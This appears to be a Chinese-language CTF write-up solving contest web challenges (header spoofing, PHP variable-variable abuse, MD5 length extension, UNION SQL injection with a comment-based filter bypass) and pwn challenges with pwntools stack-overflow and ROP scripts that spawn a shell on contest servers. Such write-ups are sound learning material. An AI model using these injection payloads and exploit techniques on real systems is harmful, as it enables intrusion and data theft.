<img data-src-webp="https://ae01.alicdn.com/kf/Hc6f0872601eb4bd89ee5a5c988bbe7c5T.jpg" data-src="https://ae01.alicdn.com/kf/U6f9bafce3b7f449bbbd3102cbcfd642dP.png">

按照提示加 GET 和 POST 参数，然后请求头加个 `X-Forwarded-For: 127.0.0.1` 假装是管理员自己上了服务器打开这个页面就可以得到 `flag{Y0ur_pHp_1s_s1xsix6}`。

## BabyPHP

可变变量漏洞。虽然有 `$_POST` 但是完全不用管它，直接以 GET 方式访问，参数：`akarin=flag&flag=akarin` 即可得到 `flag{GSH1ydsbnYtshkjhs}`。

（参数的 `akarin` 可替换为任意内容，但是参数顺序不能变）

```php
// 因为不是用 POST 访问，所以 isset($_POST['flag'] )为 false，取反后为 true
// isset($_GET['flag']) 为 true，取反后为 false，所以不执行
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($msg_giveme);
}

// 已绕过
if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($msg_getout);
}

// 因为没有 $_POST，这一段也跳过了
foreach ($_POST as $key => $value) {
    $$key = $value;
}

// 实际执行的顺序：
// $akarin = $flag;
// $flag = $akarin;
// 结果：flag 毫发无损
foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;
```

<img data-src-webp="https://ae01.alicdn.com/kf/H5569924e84a5401cbbfa72dfd202e9c5i.jpg" data-src="https://ae01.alicdn.com/kf/Uf6a3cea05dab4cf88616afae7c14173bd.png">

## EasyPHP

翻注释然后去 `http://35.194.143.125:4517/source.txt` 看源代码。

```php
<?php
$flag = "XXXXXXXXXXXXXXXXXXXXXX";
$secret = "XXXXXXXXXX"; // 十个字符，这是解题的关键

if(!isset($_POST["username"]) || !isset($_POST["password"])){
    exit();
}
$username = $_POST["username"];
$password = $_POST["password"];

if (!empty($_COOKIE["check"])) {

    if (urldecode($username) === "admin" && urldecode($password) != "admin") {
        if ($_COOKIE["check"] === md5($secret . urldecode($username . $password))) {
            echo "Login successful.\n";
            die ("The flag is ". $flag);
        }
        else {
            die ("Wrong Cookies. Get out!");
        }
    }
    else {
        die ("Admins only");
    }
}

// 这里得到的 MD5 是 f7fa8882c893a3f48f3cecdaa2f52102，固定不变
setcookie("ahash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));
?>
```

~~目标是找到 `$username` 和 `$password`，符合以下要求：~~
* ~~`urldecode($username) === "admin"`~~
* ~~`urldecode($password) != "admin"`~~
* ~~`urldecode($username . $password) === "adminadmin"`~~

↑不存在的（doge）

找了一下，关键词是“MD5 的 HASH 扩展攻击”。参见：https://www.cnblogs.com/pcat/p/5478509.html

所以就去虚拟机装上 `hashpump`，然后设置 Cookie 为生成的 MD5，设置 `password` 为另外那一堆很长的值，然后就可以得到 `flag{G_du93ksy639_sjd}`。

```plaintext
root@kali:~# hashpump
Input Signature: f7fa8882c893a3f48f3cecdaa2f52102
Input Data: admin
Input Key Length: 15
Input Data to Add: yuruyuri
357ea255861079bcbcdff9035290e554
admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00yuruyuri
```

<img data-src-webp="https://ae01.alicdn.com/kf/Hcc8cc92b2d3e4895be9a9c9b45e78a514.jpg" data-src="https://ae01.alicdn.com/kf/U619df79cacdd4579b24ce862f1b1675cu.png">

<img data-src-webp="https://ae01.alicdn.com/kf/H5f5bb0a079714f08902bd54136f64d650.jpg" data-src="https://ae01.alicdn.com/kf/U8bdcbcc1d84a4d96a3cf3c1bab2980b0S.png">

## Babysql

<img data-src-webp="https://ae01.alicdn.com/kf/Hc75de0f8d0c54d9aa0ef5c66f225a5d5A.jpg" data-src="https://ae01.alicdn.com/kf/U9bdb510bc2f44d2dae6582411b0b8d237.png">

其实用 `UNION` 直接注入就可以了，一开始就想到了这个，不过因为没有语句闭合所以很久都没做出来……输入 `-1' UNION SELECT flag,flag,flag FROM flag#` 就可以得到 `flag{Hh_N1c3_1}`。

“语句闭合”指的是碰到 `... WHERE id = '***` 这种语句，将 *** 设为 `1' UNION ...` 而不是 `1`，组合后的语句就是 `... WHERE id = '1' UNION ...` 而不是 `WHERE id = '1 UNION ...`，后者显然是有问题的。

不过按照题目上的源代码，不闭合不注释输入 `-1 UNION SELECT flag,flag,flag FROM flag` 构成 `SELECT * FROM users where id=-1 UNION SELECT flag,flag,flag FROM flag` 应该也是没问题的，但是实际上必须要有闭合和注释，也许是题目的代码给错了……？

SQL 语句中有某些单词的话，就会直接返回“hacker!”，这是为了防止删库跑路吧 233

## ~~SELECT_me!~~ Easysql

~~官方改名，果然是续作~~

<img data-src-webp="https://ae01.alicdn.com/kf/H942ba2578cad424692d911f39fb153b9K.jpg" data-src="https://ae01.alicdn.com/kf/Ue2103291212343c28ba9be0eaa9399a5o.png">

上一题的**续作**，这次就算只输入一个空格也会出现“hacker!”，解决方法是用注释 `/**/` 替代空格：`-1'/**/UNION/**/SELECT/**/flag,flag,flag/**/FROM/**/flag#`，然后得到 `flag{u_c4ught_me}`。

## Lottery

~~中途加入的送分题，娱乐题~~

~~经过测试，中奖率大概是 0.04%~~

<img data-src-webp="https://ae01.alicdn.com/kf/H76d7dc74c1c74843af81daa176127cb4h.jpg" data-src="https://ae01.alicdn.com/kf/Uc7b2dcda5d0e4bcfaf0c004f57b1599fE.png">

注意：大转盘上的“flag”字样写反了（滑稽

一次一次地抽奖就算了，还得看转盘转转转，浪费时间，不如直接看源代码。每次抽奖时会从 `http://35.194.143.125:4522/data.php` 获取抽奖结果，返回类似于以下格式的 JSON 数据：

```plaintext
{
    "angle":306,
    "prize":"四等奖",
    "flag":"你看看你，看看你，成天就想要flag!"
}
```

注意大转盘上的 flag 部分在 150-210 度的范围内，所以可以自动抽奖（滑稽），一直到角度在 150-210 为止。

下面的抽奖脚本使用 PowerShell 实现（懒得再去查怎么用 Python 访问 URL 和解析 JSON 了）：

```powershell
while ($true) {
    $Request = Invoke-RestMethod 'http://35.194.143.125:4522/data.php'
    if ($Request.angle -ge 150 -and $Request.angle -le 210) {
        Write-Host $Request.flag
        break
    }
}
```

<img data-src-webp="https://ae01.alicdn.com/kf/Hcf1eb2207b954b6c970f151e2124fa5aQ.jpg" data-src="https://ae01.alicdn.com/kf/Hb1db1533871248bf94e3d334a6023847U.jpg">

最后得到 `flag{You_are_really_the_European_emperor!!!}`。

# pwn

## babyrip

<img data-src-webp="https://ae01.alicdn.com/kf/H2b9c26b5b9974848b20608f3e8be7e89E.jpg" data-src="https://ae01.alicdn.com/kf/Ue6c17547c0cc4bc99312947143b464f9j.png">

之前没做过 pwn，这次为了拿分不得不开始踩坑……

`v1` 存在栈溢出，左边有个 `backd00r` 函数（地址 `0x4007D5`）可以得到 Shell。

<img data-src-webp="https://ae01.alicdn.com/kf/H13a2cfb12c204ccbbf97741ded2c616fi.jpg" data-src="https://ae01.alicdn.com/kf/Uf214f097ba1848a6adffa114eda172585.png">

`v1` 的栈的长度被~~钦定硬点~~为 `0xF0`，按照 IDA 这边的提示，下面还有 `0x08` 的 s，然后就是返回地址 r，目标是要把这个 r 给强行覆盖成 `backd00r`。

```python
#!/usr/bin/env python

from pwn import *

p = remote('34.80.207.78', 10000)
p.recvuntil(':')
p.sendline('a' * 0xF8 + p64(0x4007D5))
p.interactive()
```

<img data-src-webp="https://ae01.alicdn.com/kf/He0f4d7f1ac294f979ca89a3c18cbc9c0C.jpg" data-src="https://ae01.alicdn.com/kf/Uf96d0adb51f14f20af0fba2d24782941Q.png">

`flag{9af42a36-72cd-43c5-be0f-aae3aebbad}`

## babyrop

做这题的时候大量参考了 [CTF Wiki 上的 ROP 教程](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/)，不过因为没有专门学过汇编，对 ROP 还是很难理解啊……

<img data-src-webp="https://ae01.alicdn.com/kf/H421fbf9aff334acdb4031104292204deM.jpg" data-src="https://ae01.alicdn.com/kf/U0bcb5df2240847c8b300574d4fcbfef1L.png">

用 `checksec` 看一下，因为加了栈不可执行保护（NX），所以上一道题的方法不管用了。而且虽然有个 `backdoor` 函数，不过那里写的是 `system("echo FLAG")`，是个**假后门**。

<img data-src-webp="https://ae01.alicdn.com/kf/H82ee9b7a3507466485609b0eca7f667dQ.jpg" data-src="https://ae01.alicdn.com/kf/He2215e46bbf54e43b5c17ad9b63fe850P.png">

`echo FLAG` 的地址被传进了 edi（或者是 rdi？），~~在艰苦地查阅了大量的资料后~~，得到的结论是应该构造 ROP 链 `pop rdi, ret`（地址 `0x400803`），然后把这个 `echo FLAG` 换成 `/bin/sh`（地址 `0x400836`）。

<img data-src-webp="https://ae01.alicdn.com/kf/H95bdb15fdc994d8386f07cd89e843b25s.jpg" data-src="https://ae01.alicdn.com/kf/U6702c81a16264e0bb8ed099da917dd5al.png">

`flag{b94b8c51-c3c3-45fd-8cad-52e0ef894}`

```python
#!/usr/bin/env python

from pwn import *

p = remote('34.80.207.78', 10001)
p.recvuntil(':')

payload = ''
payload += 'a' * 0xF8 # 栈溢出
payload += p64(0x400803) # ROP 链
payload += p64(0x400836) # 取 /bin/sh 字符串
payload += p64(0x400724) # 跳转到 call _system 获取 shell
p.sendline(payload)
p.interactive()
```

<img data-src-webp="https://ae01.alicdn.com/kf/H98f82e3235ce43f9bf5903e0624e7f47T.jpg" data-src="https://ae01.alicdn.com/kf/U2fa02d99f25e46ada662e7613230db87q.png">

## babystack

只要会了 babyrip，就不难理解这题了| ू•ૅω•́)ᵎᵎᵎ

<img data-src-webp="https://ae01.alicdn.com/kf/H7b80555274d24523a6d952e8a48ec191i.jpg" data-src="https://ae01.alicdn.com/kf/U4c9463eeb89a43f6b2b4b1652cee31269.png">

把 `v3` 的值弄成 `0x1337ABC`，就可以马上拿到 Shell。之前的 babyrip 是通过溢出强行把函数的**返回地址**改为 Shell，这次就是要修改**变量的值**了。`v3` 在栈中的存储紧跟在 `v2` 后面，所以只要在输入 `v2` 时使用溢出就可以强行修改 `v3` 的值。


```python
#!/usr/bin/env python

from pwn import *

p = remote('34.80.207.78', 10002)
# 第一次输入保存到 s，不重要
p.recvuntil(':')
p.sendline('a')
# 第二次输入保存到 v2，此时可以使用栈溢出覆盖 v3 的值
p.recvuntil(':')
p.sendline('a' * 0xF8 + p64(0x1337ABC))
p.interactive()
```

<img data-src-webp="https://ae01.alicdn.com/kf/Hc639609d605d48eb89aec1b7351ebe558.jpg" data-src="https://ae01.alicdn.com/kf/U90519bc277a64b288a083e40d68c3daao.png">

`flag{eb715228-7d01-45e6-8208-8bb9275f73d3}`

---

最后是个彩蛋( ﾟ∀。)

在比赛结束的前几个小时，由那位传说级菊苣带头，大家一起改起了自己的 ID，排行榜上充满了快活的空气。

<img data-src-webp="https://ae01.alicdn.com/kf/H7443a9c8724a4687af3c610203a70e97G.jpg" data-src="https://ae01.alicdn.com/kf/H9fa595bea07f49fab7852ea9264a65b2g.jpg">

遗憾的是，到了晚上，管理员将这些 ID 全部都改成了参赛者的姓和“XX”，例如“曾XX”、“张XX”之类的。于是整个排行榜突然从聊天室变成了~~枪毙名单~~。

（当时没有截图，大家自己脑补吧┐(´-｀)┌）

---

写完这篇 Write-Up 之后没多久，在朋友圈看到了（另一位）某君吐槽自己熬夜做题还被菊苣们吊打终于到周末可以回血了，然后发了一张排行榜截图和八张与女票一起出去玩的合照。

`flag{1_h4v3_a_g1rlfri3nd}`，这题的价值远远不止 500 分，我还是输了( ・\_ゝ・)

<img data-src-webp="https://ae01.alicdn.com/kf/U5f0c851d7447457faee9752d3768ddcbK.jpg" data-src="https://ae01.alicdn.com/kf/U5914843156ac418480b159ca4d2b7c16j.png">